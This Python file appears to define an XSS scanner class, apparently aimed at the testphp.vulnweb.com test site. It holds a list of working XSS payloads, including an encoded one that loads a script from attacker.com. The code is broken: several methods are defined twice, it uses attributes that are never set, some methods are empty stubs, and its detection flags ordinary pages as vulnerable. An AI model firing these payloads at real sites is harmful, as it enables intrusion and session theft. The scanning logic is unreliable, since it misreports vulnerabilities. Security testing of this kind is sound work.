from .base_scanner import BaseScanner
from bs4 import BeautifulSoup
import urllib.parse
import asyncio
import random
import string
import tempfile
import os
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
import traceback
from datetime import datetime
import aiohttp
from .nuclei_scanner import NucleiScanner
import logging

class XSSScanner(BaseScanner):
    def __init__(self, session, config):
        super().__init__(session, config)
        self.url = None
        self.browser = None
        self.context = None
        self.page = None
        self.local_session = None
        self.semaphore = None
        self.seen_urls = set()  # Track scanned URLs
        self.found_vulnerabilities = set()  # Track unique vulnerabilities
        
        # Enhanced XSS payloads
        self.xss_payloads = [
            # Basic payloads
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            
            # Event handlers
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)',
            "' onfocus='alert(1)",
            
            # IMG payloads
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            
            # SVG payloads
            '<svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            '\'><svg/onload=alert(1)>',
            
            # JavaScript protocol
            'javascript:alert(1)',
            'javascript:alert(1)//',
            
            # Data protocol
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            
            # Encoded payloads
            '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            
            # Special characters
            '";alert(1);//',
            '\';alert(1);//'
        ]
        
        # Add more sophisticated payloads
        self.xss_payloads.extend([
            # DOM-based XSS payloads
            '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vYXR0YWNrZXIuY29tL2EuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
            '"><script>location.href=\'javascript:\'+decodeURIComponent(\'alert%281%29\')</script>',
            
            # Template injection payloads
            '${alert(1)}',
            '{{constructor.constructor(\'alert(1)\')()}}',
            
            # Polyglot payloads
            'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
            
            # Filter bypass payloads
            '"><sCr<script>ipt>alert(1)</sCr</script>ipt>',
            '"><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>',
            
            # Event handler variations
            '" onmouseenter="alert(1)" autofocus="',
            '" onfocusin="alert(1)" autofocus="',
            '" ondragenter="alert(1)" draggable="true'
        ])

        # Configure scan limits
        self.config.update({
            'max_urls_per_scan': 100,
            'max_depth': 3,
            'concurrent_requests': 10,
            'request_timeout': 5,
            'skip_similar_params': True,
            'skip_static_files': True,
            'check_dom_xss': True,
            'check_stored_xss': True,
            'browser_checks': True,
            'recursive_scan': True,
            'max_recursion_depth': 3
        })

        self.current_scan_info = {
            'stage': 'Initializing',
            'current_target': None,
            'completed': 0,
            'total': 0,
            'found_vulnerabilities': 0
        }

        # Initialize Nuclei scanner
        self.nuclei_scanner = NucleiScanner(session, config)

        # Initialize scan logs
        self.scan_logs = []
        self.log_level_colors = {
            'INFO': 'blue',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'SUCCESS': 'green',
            'DEBUG': 'gray'
        }

        # Add these test cases for testphp.vulnweb.com
        self.xss_test_cases = [
            # Known vulnerable parameters
            'searchFor',
            'artist',
            'cat',
            'aid',
            'comment',
            
            # Known vulnerable paths
            '/search.php',
            '/artists.php',
            '/guestbook.php',
            '/comment.php'
        ]

        # Add these payloads
        self.xss_payloads.extend([
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '"><svg/onload=alert("XSS")>'
        ])

    def log(self, message, level='INFO', details=None):
        """Enhanced logging with timestamp and structure"""
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'level': level,
            'message': message,
            'details': details,
            'color': self.log_level_colors.get(level, 'black')
        }
        self.scan_logs.append(log_entry)
        self.logger.log(getattr(logging, level), message)

    async def scan(self, url):
        """Scan for XSS vulnerabilities"""
        try:
            self.logger.info(f"Scanning for XSS vulnerabilities on {url}")
            response, content = await self.make_request(url)
            if not content:
                self.logger.error(f"Failed to access target URL: {url}")
                return None
            
            # Check for XSS payloads in the response
            vulnerabilities = []
            for payload in self.xss_payloads:
                if payload in content:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'description': f"Reflected XSS found with payload: {payload}",
                        'url': url
                    })
            return {'vulnerabilities': vulnerabilities}
        
        except Exception as e:
            self.logger.error(f"Error during XSS scan: {str(e)}")
            return None

    async def identify_entry_points(self, soup):
        """Identify potential XSS entry points"""
        entry_points = []
        
        # URL parameters
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        for param in params:
            entry_points.append({
                'type': 'parameter',
                'name': param,
                'context': 'url'
            })

        # Forms and inputs
        forms = soup.find_all('form')
        for form in forms:
            entry_points.append({
                'type': 'form',
                'element': form,
                'context': 'html'
            })
            
            inputs = form.find_all(['input', 'textarea'])
            for input_field in inputs:
                if self.is_testable_input(input_field):
                    entry_points.append({
                        'type': 'input',
                        'element': input_field,
                        'context': 'form'
                    })

        return entry_points

    def is_testable_input(self, input_field):
        """Check if input field should be tested"""
        if not input_field.get('name'):
            return False
            
        input_type = input_field.get('type', '').lower()
        skip_types = ['hidden', 'submit', 'button', 'image', 'file']
        
        return input_type not in skip_types

    async def test_parameter(self, url, param):
        """Test a parameter for XSS"""
        try:
            results = []
            for payload in self.xss_payloads:
                if await self.check_xss_vulnerability(url, param, payload):
                    results.append({
                        'type': 'XSS',
                        'description': f'XSS vulnerability found in parameter {param}',
                        'severity': 'High',
                        'details': {
                            'url': url,
                            'parameter': param,
                            'payload': payload
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
            return results
        except Exception as e:
            self.logger.error(f"Error testing parameter {param}: {str(e)}")
            return []

    async def test_form(self, url, form):
        """Test a form for XSS vulnerabilities"""
        try:
            results = []
            # ... form testing code ...
            return results
        except Exception as e:
            self.logger.error(f"Error testing form: {str(e)}")
            return []

    async def test_input_field(self, url, input_field):
        """Test an input field for XSS vulnerabilities"""
        try:
            results = []
            # ... input field testing code ...
            return results
        except Exception as e:
            self.logger.error(f"Error testing input field: {str(e)}")
            return []

    async def test_link(self, href):
        """Test a link for XSS vulnerabilities"""
        try:
            results = []
            # ... link testing code ...
            return results
        except Exception as e:
            self.logger.error(f"Error testing link: {str(e)}")
            return []

    def add_vulnerability(self, description, severity, details=None):
        """Add a vulnerability with proper structure"""
        vuln = {
            'type': 'XSS',
            'description': description,
            'severity': severity,
            'details': details,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        if not hasattr(self, 'vulnerabilities'):
            self.vulnerabilities = []
        self.vulnerabilities.append(vuln)
        self.logger.warning(f"Found XSS vulnerability: {description}")

    def should_test_url(self, url):
        """Check if URL should be tested"""
        if url in self.seen_urls:
            return False
            
        # Skip static files
        if self.config['skip_static_files']:
            static_extensions = ['.jpg', '.png', '.gif', '.css', '.js', '.ico']
            if any(url.lower().endswith(ext) for ext in static_extensions):
                return False
                
        # Skip external URLs if configured
        if self.config['skip_external_urls'] and url.startswith(('http://', 'https://')):
            if not url.startswith(self.url):
                return False
                
        self.seen_urls.add(url)
        return True

    async def test_target(self, target):
        """Test a single target with concurrency control"""
        async with self.semaphore:
            try:
                target_type = target[0]
                target_info = {
                    'url_param': f'Testing URL parameter: {target[1]}',
                    'form': f'Testing form input: {target[1].get("name", "unknown")}',
                    'input': f'Testing input field: {target[1].get("name", "unknown")}',
                    'link': f'Testing link: {target[1]}'
                }
                
                self.current_scan_info['current_target'] = target_info.get(target_type, 'Testing target')
                
                result = []
                if target_type == 'url_param':
                    result = await self.test_url_parameter(target[2], target[1])
                elif target_type == 'form':
                    result = await self.test_form_input(target[1], target[2], target[3])
                elif target_type == 'input':
                    result = await self.test_input_field(target[2], target[1])
                elif target_type == 'link':
                    result = await self.test_link(target[1])
                
                self.current_scan_info['completed'] += 1
                return result
                
            except Exception as e:
                print(f"[DEBUG] Error testing target: {str(e)}")
                self.current_scan_info['completed'] += 1
                return []

    async def cleanup(self):
        """Cleanup all resources"""
        try:
            print("\n[DEBUG] Starting cleanup")
            
            # Close browser if exists
            if self.browser:
                try:
                    await self.browser.close()
                    print("[DEBUG] Browser closed")
                except Exception as e:
                    print(f"[DEBUG] Error closing browser: {str(e)}")

            # Close all tracked sessions
            while self._session_stack:
                session = self._session_stack.pop()
                try:
                    if not session.closed:
                        await session.close()
                        print("[DEBUG] Closed a session")
                except Exception as e:
                    print(f"[DEBUG] Error closing session: {str(e)}")

            # Close connector
            if self.connector and not self.connector.closed:
                try:
                    await self.connector.close()
                    print("[DEBUG] Connector closed")
                except Exception as e:
                    print(f"[DEBUG] Error closing connector: {str(e)}")

            # Clear references
            self.local_session = None
            self.connector = None
            self.semaphore = None
            
            print("[DEBUG] Cleanup completed")
            
        except Exception as e:
            print(f"[DEBUG] Error during cleanup: {str(e)}")
            print(f"[DEBUG] Traceback: {traceback.format_exc()}")

    async def __aenter__(self):
        """Context manager entry"""
        await self.initialize()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        await self.cleanup()
        if exc_val:
            print(f"[DEBUG] Error in context manager: {str(exc_val)}")
            print(f"[DEBUG] Traceback: {traceback.format_exc()}")

    async def make_request(self, url, method='GET', data=None, headers=None):
        """Make HTTP request using appropriate session"""
        try:
            async with self.semaphore:
                session = self.local_session or self.session
                if session.closed:
                    session = await self.create_session()
                    
                async with session.request(
                    method, 
                    url, 
                    data=data, 
                    headers=headers,
                    ssl=False
                ) as response:
                    content = await response.text()
                    return response, content
        except Exception as e:
            print(f"[DEBUG] Request error: {str(e)}")
            return None, None

    async def test_url_parameters(self, url):
        """Test URL parameters for XSS"""
        print(f"[DEBUG] Testing URL parameters for: {url}")
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters, test some common ones
        if not params:
            params = {'id': [''], 'search': [''], 'q': [''], 'page': ['']}
        
        for param in params.keys():
            for payload in self.payloads:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}"
                print(f"[DEBUG] Testing payload in URL: {test_url}")
                
                response, content = await self.make_request(test_url)
                if response and content:
                    if payload in content or self.check_xss_reflection(content, payload):
                        print(f"[DEBUG] Found XSS vulnerability in URL parameter: {param}")
                        self.add_vulnerability(
                            f"XSS vulnerability found in URL parameter\n"
                            f"URL: {url}\n"
                            f"Parameter: {param}\n"
                            f"Payload: {payload}",
                            "High"
                        )

    async def test_form(self, url, form):
        """Test form inputs for XSS"""
        print(f"[DEBUG] Testing form with action: {form.get('action', '')}")
        
        # Get form details
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea'])
        
        # Build the full action URL
        if action:
            if action.startswith('/'):
                parsed_url = urllib.parse.urlparse(url)
                action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
            elif not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(url, action)
        else:
            action = url
            
        print(f"[DEBUG] Form action URL: {action}")

        # Test each input
        for input_field in inputs:
            input_type = input_field.get('type', '').lower()
            input_name = input_field.get('name')
            
            if input_type not in ['submit', 'button', 'image', 'reset', 'file'] and input_name:
                for payload in self.payloads:
                    print(f"[DEBUG] Testing form input: {input_name} with payload: {payload}")
                    
                    if method == 'get':
                        test_url = f"{action}?{input_name}={urllib.parse.quote(payload)}"
                        response, content = await self.make_request(test_url)
                    else:
                        data = {input_name: payload}
                        response, content = await self.make_request(action, method='POST', data=data)
                        
                    if response and content:
                        if payload in content or self.check_xss_reflection(content, payload):
                            print(f"[DEBUG] Found XSS vulnerability in form input: {input_name}")
                            self.add_vulnerability(
                                f"XSS vulnerability found in form\n"
                                f"URL: {action}\n"
                                f"Method: {method.upper()}\n"
                                f"Input: {input_name}\n"
                                f"Payload: {payload}",
                                "High"
                            )

    def check_xss_reflection(self, content, payload):
        """Check if the XSS payload is reflected in the response"""
        try:
            # Basic reflection
            if payload in content:
                return True
                
            # URL encoded reflection
            encoded_payload = urllib.parse.quote(payload)
            if encoded_payload in content:
                return True
                
            # HTML encoded reflection
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            if html_encoded in content:
                return True
                
            # Script content reflection
            if 'alert(1)' in content or 'prompt(1)' in content or 'confirm(1)' in content:
                return True
                
            return False
            
        except Exception as e:
            print(f"[DEBUG] Error in XSS reflection check: {str(e)}")
            return False

    async def test_input_field(self, url, input_field):
        """Enhanced input field testing"""
        vulnerabilities = []
        field_name = input_field.get('name', '')
        field_type = input_field.get('type', '').lower()
        field_id = input_field.get('id', '')

        self.logger.debug(f"Testing input field: {field_name} (type: {field_type})")

        # Skip certain input types
        if field_type in ['hidden', 'submit', 'button', 'image', 'file']:
            return []

        for payload in self.xss_payloads:
            try:
                # Test both GET and POST methods
                for method in ['GET', 'POST']:
                    if method == 'GET':
                        test_url = f"{url}?{field_name}={urllib.parse.quote(payload)}"
                        response, content = await self.make_request(test_url)
                    else:
                        data = {field_name: payload}
                        response, content = await self.make_request(url, method='POST', data=data)

                    if response and content:
                        if await self.check_xss_reflection(content, payload):
                            vuln = {
                                'type': 'XSS',
                                'description': f'XSS vulnerability found in {field_name}',
                                'severity': 'High',
                                'details': {
                                    'input_name': field_name,
                                    'input_type': field_type,
                                    'input_id': field_id,
                                    'payload': payload,
                                    'method': method,
                                    'url': url
                                },
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            self.logger.warning(f"Found XSS vulnerability: {vuln['description']}")
                            vulnerabilities.append(vuln)

            except Exception as e:
                self.logger.error(f"Error testing input {field_name}: {str(e)}")
                continue

        return vulnerabilities

    async def test_url_parameter(self, url, param):
        """Enhanced URL parameter testing"""
        vulnerabilities = []
        self.logger.debug(f"Testing URL parameter: {param}")

        for payload in self.xss_payloads:
            try:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                # Test parameter with different payload positions
                test_variations = [
                    {param: [payload]},  # Replace value
                    {param: [params.get(param, [''])[0] + payload]},  # Append to existing value
                    {param: [payload + params.get(param, [''])[0]]},  # Prepend to existing value
                ]

                for test_params in test_variations:
                    params.update(test_params)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(params, doseq=True),
                        parsed.fragment
                    ))

                    response, content = await self.make_request(test_url)
                    if response and content:
                        if await self.check_xss_reflection(content, payload):
                            vuln = {
                                'type': 'XSS',
                                'description': f'XSS vulnerability found in URL parameter {param}',
                                'severity': 'High',
                                'details': {
                                    'parameter': param,
                                    'payload': payload,
                                    'url': url,
                                    'test_url': test_url
                                },
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            self.logger.warning(f"Found XSS vulnerability: {vuln['description']}")
                            vulnerabilities.append(vuln)

            except Exception as e:
                self.logger.error(f"Error testing parameter {param}: {str(e)}")
                continue

        return vulnerabilities

    async def test_link(self, href):
        """Test a link for XSS vulnerabilities"""
        try:
            print(f"[DEBUG] Testing link: {href}")
            
            # Skip external links, javascript: links, and anchors
            if (href.startswith(('http://', 'https://')) and self.config['skip_external_urls']) or \
               href.startswith(('javascript:', '#', 'mailto:', 'tel:')):
                return

            # Build absolute URL if relative
            if not href.startswith(('http://', 'https://')):
                parsed_url = urllib.parse.urlparse(self.url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                href = urllib.parse.urljoin(base_url, href)

            # Parse URL and check for parameters
            parsed = urllib.parse.urlparse(href)
            params = urllib.parse.parse_qs(parsed.query)
            
            if params:
                print(f"[DEBUG] Found parameters in link: {params}")
                for param_name in params:
                    for payload in self.payloads:
                        # Create test URL with payload
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        query = urllib.parse.urlencode(test_params, doseq=True)
                        
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            query,
                            parsed.fragment
                        ))
                        
                        print(f"[DEBUG] Testing link with payload: {test_url}")
                        
                        # Make request
                        response, content = await self.make_request(test_url)
                        if response and content:
                            if payload in content or self.check_xss_reflection(content, payload):
                                print(f"[DEBUG] Found XSS vulnerability in link parameter: {param_name}")
                                self.add_vulnerability(
                                    f"XSS vulnerability found in link\n"
                                    f"URL: {href}\n"
                                    f"Parameter: {param_name}\n"
                                    f"Payload: {payload}",
                                    "High"
                                )
                                
        except Exception as e:
            print(f"[DEBUG] Error testing link {href}: {str(e)}")
            print(f"[DEBUG] Traceback: {traceback.format_exc()}")

    def get_scan_progress(self):
        """Get current scan progress information"""
        return {
            'stage': self.current_scan_info['stage'],
            'current_target': self.current_scan_info['current_target'],
            'progress': (self.current_scan_info['completed'] / max(self.current_scan_info['total'], 1)) * 100,
            'completed': self.current_scan_info['completed'],
            'total': self.current_scan_info['total'],
            'found_vulnerabilities': self.current_scan_info['found_vulnerabilities']
        }

    async def check_xss_reflection(self, content, payload):
        """Enhanced XSS reflection check"""
        try:
            # Basic reflection check
            if payload in content:
                self.logger.debug(f"Found direct payload reflection: {payload}")
                return True

            # Check for encoded versions
            encoded_variations = [
                urllib.parse.quote(payload),
                urllib.parse.quote_plus(payload),
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                payload.replace('<', '%3C').replace('>', '%3E'),
                payload.lower(),
                payload.upper()
            ]

            for variation in encoded_variations:
                if variation in content:
                    self.logger.debug(f"Found encoded payload reflection: {variation}")
                    return True

            # Check for script execution indicators
            script_indicators = [
                'alert(1)',
                'alert%281%29',
                'alert&#40;1&#41;',
                'alert&lpar;1&rpar;'
            ]

            for indicator in script_indicators:
                if indicator in content:
                    self.logger.debug(f"Found script execution indicator: {indicator}")
                    return True

            # Add more sophisticated checks
            if await self.check_javascript_execution(content, payload):
                return True
                
            if await self.check_dom_manipulation(content, payload):
                return True
                
            return False
            
        except Exception as e:
            self.logger.error(f"Error in XSS reflection check: {str(e)}")
            return False

    async def check_javascript_execution(self, content, payload):
        """Check for successful JavaScript execution"""
        try:
            # Look for signs of JavaScript execution
            execution_indicators = [
                'alert(1)',
                'window.alert',
                'document.cookie',
                'eval(',
                'Function(',
                'setTimeout(',
                'setInterval('
            ]
            
            return any(indicator in content for indicator in execution_indicators)
            
        except Exception as e:
            self.logger.error(f"Error checking JavaScript execution: {str(e)}")
            return False

    async def check_dom_manipulation(self, content, payload):
        """Check for DOM manipulation"""
        try:
            # Look for DOM manipulation indicators
            dom_indicators = [
                'document.write',
                'innerHTML',
                'outerHTML',
                'insertAdjacentHTML',
                'createTextNode',
                'createElement'
            ]
            
            return any(indicator in content for indicator in dom_indicators)
            
        except Exception as e:
            self.logger.error(f"Error checking DOM manipulation: {str(e)}")
            return False

    async def check_dom_xss(self, url):
        """Check for DOM-based XSS vulnerabilities"""
        try:
            self.logger.info(f"Checking DOM-based XSS for {url}")
            
            # Initialize browser if needed
            if not self.browser:
                async with async_playwright() as p:
                    browser = await p.chromium.launch()
                    page = await browser.new_page()
                    
                    # Monitor JavaScript execution
                    await page.add_script_tag(content="""
                        window.addEventListener('error', function(e) {
                            window._xssErrors = window._xssErrors || [];
                            window._xssErrors.push(e.message);
                        });
                    """)
                    
                    # Test DOM manipulation
                    for payload in self.xss_payloads:
                        try:
                            # Inject payload into URL parameters
                            test_url = f"{url}?xss={urllib.parse.quote(payload)}"
                            await page.goto(test_url)
                            
                            # Check for successful execution
                            has_xss = await page.evaluate("""() => {
                                return window._xssErrors && 
                                       window._xssErrors.some(e => e.includes('alert'));
                            }""")
                            
                            if has_xss:
                                self.add_vulnerability(
                                    description=f"DOM-based XSS found",
                                    severity="High",
                                    details={
                                        'url': test_url,
                                        'payload': payload,
                                        'type': 'DOM-XSS'
                                    }
                                )
                                
                        except Exception as e:
                            self.logger.error(f"Error testing DOM XSS: {str(e)}")
                            
                    await browser.close()
                    
        except Exception as e:
            self.logger.error(f"Error in DOM XSS check: {str(e)}")

    async def check_stored_xss(self, url):
        """Check for stored XSS vulnerabilities"""
        try:
            self.logger.info(f"Checking stored XSS for {url}")
            
            # Find forms that might store data
            response, content = await self.make_request(url)
            if response and content:
                soup = BeautifulSoup(content, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    # Look for forms that might store data
                    if form.get('method', '').lower() == 'post':
                        inputs = form.find_all(['input', 'textarea'])
                        
                        # Test each input
                        for input_field in inputs:
                            if self.is_testable_input(input_field):
                                for payload in self.xss_payloads:
                                    try:
                                        # Submit form with payload
                                        data = {input_field['name']: payload}
                                        await self.make_request(url, method='POST', data=data)
                                        
                                        # Check if payload appears in subsequent requests
                                        check_response, check_content = await self.make_request(url)
                                        if check_content and payload in check_content:
                                            self.add_vulnerability(
                                                description=f"Stored XSS found",
                                                severity="High",
                                                details={
                                                    'url': url,
                                                    'input': input_field['name'],
                                                    'payload': payload,
                                                    'type': 'Stored-XSS'
                                                }
                                            )
                                            
                                    except Exception as e:
                                        self.logger.error(f"Error testing stored XSS: {str(e)}")
                                        
        except Exception as e:
            self.logger.error(f"Error in stored XSS check: {str(e)}")